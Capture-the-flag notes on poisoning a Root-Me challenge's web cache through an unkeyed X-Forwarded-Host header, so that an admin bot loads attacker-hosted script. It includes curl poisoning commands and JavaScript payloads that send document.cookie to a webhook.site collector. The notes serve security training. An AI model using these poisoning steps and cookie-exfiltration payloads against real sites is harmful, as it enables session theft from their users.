# Web Cache Poisoning — Unkeyed HTTP Header

- Platform: Root-Me Pro
- Category: Web · Easy · 250 pts · ~45 min
- Subtitle: "Perfomance optimization"
- Flag format: `RM{...}`
- Tools hinted: Burp Suite, cURL

## Description

> Given the large number of people using your username personalization application,
> the system administrator recently implemented a cache system to reduce the load.
>
> When you mentioned that he should be careful how he implements it, he replied that
> it's just a cache and there's nothing to worry about.

## Target

- Instance URL: `https://instance-019fea0e-82f3-72ca-a006-e414c93b6338.challenges.root-me.pro`
- Stack: Flask / Werkzeug 3.1.3 / Python 3.11.14, custom cache in front
- Cache headers: `x-cache: hit|miss`, `cache-control: public, max-age=86400`
- No `Vary` header at all → nothing beyond the URL is declared as part of the key

## Findings

### App surface
- `GET /` — username personalization form. `?username=X` renders `<h3>Waouuuw X!!!</h3>`
- `GET|POST /report` — submit a path, bot visits it. Response: *"Your request has been sent
  to an administrator!"*
- No cookie is set for anonymous users → the flag is almost certainly on the admin bot's session
- `/robots.txt`, `/flag`, `/admin`, `/.git/config`, `/app.py` → all 404

### Username reflection is NOT injectable
Jinja autoescape is on: `<img src=x onerror=alert(1)>"'` came back as
`&lt;img src=x onerror=alert(1)&gt;&#34;&#39;`. No direct XSS via the param.

### The real primitive — host-derived `<script src>`
When `?username=` is present, the page renders an extra block containing a
**protocol-relative absolute script URL built from the request host**:

```html
<script src="//instance-019fea0e-....challenges.root-me.pro/static/js/confettis_manager.js"></script>
```

`X-Forwarded-Host` overrides that host. Probed 9 host-ish headers with a cache-buster;
only `X-Forwarded-Host` has any effect:

```
X-Forwarded-Host: pk9z1q.example.net
  ->  <script src="//pk9z1q.example.net/static/js/confettis_manager.js">
```

> Gotcha for next time: my *first* header sweep found nothing because I probed
> `/?cb=N` with **no username** — the vulnerable block only renders when `username`
> is set. Always probe against the page state that actually contains the sink.

### Confirmed unkeyed
```
CB=171409964
curl "/?username=poc&cb=$CB" -H "X-Forwarded-Host: evil-unkeyed-test.net"   -> x-cache: miss, src=//evil-unkeyed-test.net/...
curl "/?username=poc&cb=$CB"    (no header at all)                          -> x-cache: hit,  src=//evil-unkeyed-test.net/...
```
The header changes the response body but not the cache key → a clean request is served
the attacker-controlled script tag. That is the whole bug.

### Escaping of the header value
Autoescaped for HTML, so **no attribute breakout**:
- `a"><svg onload=alert(1)>` → `//a&#34;&gt;&lt;svg ...` (dead)

But `/`, `?` and `#` pass through **unescaped**:
- `a?`  → `src="//a?/static/js/confettis_manager.js"`

So the trailing `/static/js/confettis_manager.js` can be swallowed into a query string,
letting the src point at an arbitrary URL:
`X-Forwarded-Host: myhost.tld/payload.js?` → `//myhost.tld/payload.js?/static/js/confettis_manager.js`

### Dead end — reading the bot's own response back out of the cache
Hoped the bot's (authenticated) response would be cached under the reported URL so I
could just fetch it. Reported a fresh `/?username=probe&cb=botprobe20034`, waited 25s,
fetched it: `x-cache: miss` and byte-identical to an anonymous render. The bot's
response is not cached. Abandoning that shortcut — XSS is required.

## Blocker: need an HTTPS host for the payload

The page is HTTPS and the src is protocol-relative (`//`), so it resolves to **https://**.
A plain-HTTP host gets blocked as mixed content → the payload host must serve **TLS**.
This VM is NAT'd (10.0.2.15, no public IP), so the bot cannot reach it directly.
No same-origin way to serve controlled JS: the only same-origin responses are `text/html`
starting with `<!DOCTYPE html>` (not parseable as JS) and the fixed `/static/js/*` files.

→ Requires reaching a third-party service. Paused to check scope with Pauk.

**Resolved**: webhook.site serves HTTPS and its `PUT /token/<uuid>` API lets you set
`default_content` + `default_content_type`, so it answers *any* path — including
`/static/js/confettis_manager.js` — as `application/javascript`. That's a same-shape
answer to the "need a TLS host that returns arbitrary JS at an arbitrary path" blocker.

## Exploit chain (CONFIRMED end-to-end)

1. Pick path `P = /?username=<uniq>`
2. Poison: `curl "$U$P" -H "X-Forwarded-Host: webhook.site/<uuid>"` → `x-cache: miss`
3. Verify: `curl "$U$P"` (no header) → `x-cache: hit`, script src points to attacker host
4. Report: `POST /report path=P`
5. Admin HeadlessChrome loads `P` from cache → fetches `//<attacker>/static/js/confettis_manager.js`
   → **CONFIRMED**: collector received `GET .../static/js/confettis_manager.js` from `HeadlessChrome/124`

Collector: webhook.site UUID `1c193db3-164e-4804-8c79-ada6bbd6bab5` (script src becomes
`//webhook.site/<uuid>/static/js/confettis_manager.js`). `solve.py` / `solve2.py` in this
folder automate the whole chain — `solve2.py` mints a fresh token per run so the collector
log isn't polluted by earlier attempts.

## Run log (instances 1–2)

- Instance 1: chain proven — bot (`HeadlessChrome/124`) fetched the poisoned script from the
  collector. Payload at that moment was still the webhook.site placeholder → no exfil yet.
  Instance expired (~45 min) → nginx 404.
- Instance 2: payload correctly staged (`application/javascript`, sync XHR). Poison
  `x-cache=miss` → verify `x-cache=hit` *without* the header → report accepted. 25 polls over
  150s: **no callback** (`/x`, `/err`) received. Ambiguous, because the poll loop was skipping
  script fetches — couldn't tell if the bot even loaded the page this run. Fixed in `solve.py`:
  it now prints `[bot] script fetched by: <UA>` and the payload fires a `/hello` beacon first,
  before any exfil attempt, to separate "JS never ran" from "JS ran, exfil failed".

## Diagnosis matrix for the next run

| Signal | Meaning / next step |
|---|---|
| `/hello` + `/x` both arrive | Read cookie + admin's `/` HTML, grep `RM{...}` |
| `/hello` but no `/x` | Exfil call itself is blocked — swap to top-level navigation exfil: `location="https://webhook.site/<uuid>/x?c="+encodeURIComponent(document.cookie)` |
| `[bot] script fetched` but no `/hello` | JS fetched but never executed (MIME sniffing / CSP) — check the poisoned page's `content-security-policy` response header |
| No `[bot] script fetched` at all | Bot never loaded the poisoned page — cache entry evicted before the visit, or bot was faster than the poll window. Re-poison immediately before reporting, and raise poll tries. |

## Final step (pending) — flag not yet captured

- Collector must return the payload as `Content-Type: application/javascript` — the app sends
  `X-Content-Type-Options: nosniff`, so `text/html` will not execute.
- Script runs in the **challenge origin**, so it can read the admin's `document.cookie` / DOM.
- Minimal exfil payload: `new Image().src="//webhook.site/<uuid>/x?c="+encodeURIComponent(document.cookie);`
  — though sync XHR / top-level navigation proved more reliable against the headless bot, which
  tears the page down fast (see diagnosis matrix above).

## Log

- (start) Folder created, plan written. Need instance URL.
- Fingerprinted cache, found username sink, ruled out direct XSS.
- Found + confirmed `X-Forwarded-Host` unkeyed poisoning of the script src.
- Ruled out cached-admin-response shortcut.
- Blocked on payload hosting → resolved via webhook.site (HTTPS, arbitrary JS, arbitrary path).
- Exploit chain confirmed end-to-end on 2 instances; bot fetches the poisoned script.
- Not yet captured: exfil callback hasn't landed — see diagnosis matrix, re-run `solve2.py`
  against a fresh instance next session.


## Plan

1. Fingerprint cache: look for `X-Cache`, `Age`, `Cache-Control`, `Vary`, CDN headers
   (Varnish / nginx proxy_cache). Confirm HIT/MISS behaviour with repeat requests.
2. Identify the **cache key** — normally method + host + path + query. Anything NOT in
   the key but reflected in the response body is the poisoning primitive.
3. Probe classic unkeyed headers with a cache-buster query param so I don't poison the
   shared cache while testing:
   `X-Forwarded-Host`, `X-Forwarded-Scheme/Proto`, `X-Host`, `X-Forwarded-Server`,
   `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For`, `X-Real-IP`,
   `Forwarded`, `X-HTTP-Method-Override`, plus app-specific ones (`X-Username`?
   the app is "username personalization").
4. Once a header is found reflected: verify it is unkeyed (same URL, different header
   value → cached response serves attacker value to a clean request).
5. Poison the real (un-cachebusted) URL so the admin/bot fetching it gets the payload;
   payload likely XSS or a redirect that leaks the flag, or the flag is simply revealed
   when a specific header value is cached.

## Log

- (start) Folder created, plan written. Need instance URL.
